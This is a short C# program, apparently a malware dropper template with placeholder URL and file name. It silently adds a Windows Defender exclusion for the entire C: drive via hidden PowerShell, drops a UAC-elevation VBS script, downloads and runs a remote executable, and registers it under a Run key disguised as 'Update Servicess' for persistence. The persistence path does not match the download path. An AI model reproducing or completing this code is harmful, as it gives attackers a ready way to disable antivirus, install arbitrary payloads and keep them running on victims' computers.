using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

class Program
{
    static void Main(string[] args)
    {
        Thread backgroundThread = new Thread(() =>
        {
            string tempDirectory = Path.Combine(Path.GetTempPath(), "getadmin.vbs");
            string url = "exe direct link";
            string destination = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp\your exe name.exe";

            try
            {
                if (!File.Exists(tempDirectory))
                {
                    string scriptContent = @"Set UAC = CreateObject(""Shell.Application"") : UAC.ShellExecute ""cmd.exe"", ""/c cd """"%~sdp0"""" && %~s0 %params%"", """", ""runas"", 0";
                    File.WriteAllText(tempDirectory, scriptContent);
                }

                ExecutePowerShellCommand("Add-MpPreference -ExclusionPath 'C:'");

                if (File.Exists(destination))
                    File.Delete(destination);

                new WebClient().DownloadFile(url, destination);

                ExecuteCommand("reg", "add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Update Servicess\" /t REG_SZ /d \"C:\\Windows\\your exe name.exe\" /f");

                ExecuteCommand(destination, "");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        });

        backgroundThread.IsBackground = true;
        backgroundThread.Start();

        backgroundThread.Join();
    }

    static void ExecutePowerShellCommand(string command)
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-NoProfile -ExecutionPolicy unrestricted -Command \"{command}\"",
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            UseShellExecute = false
        };

        using (Process process = Process.Start(psi))
        {
            process.WaitForExit();
        }
    }

    static void ExecuteCommand(string fileName, string arguments)
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            UseShellExecute = false
        };

        using (Process process = Process.Start(psi))
        {
            process.WaitForExit();
        }
    }
}
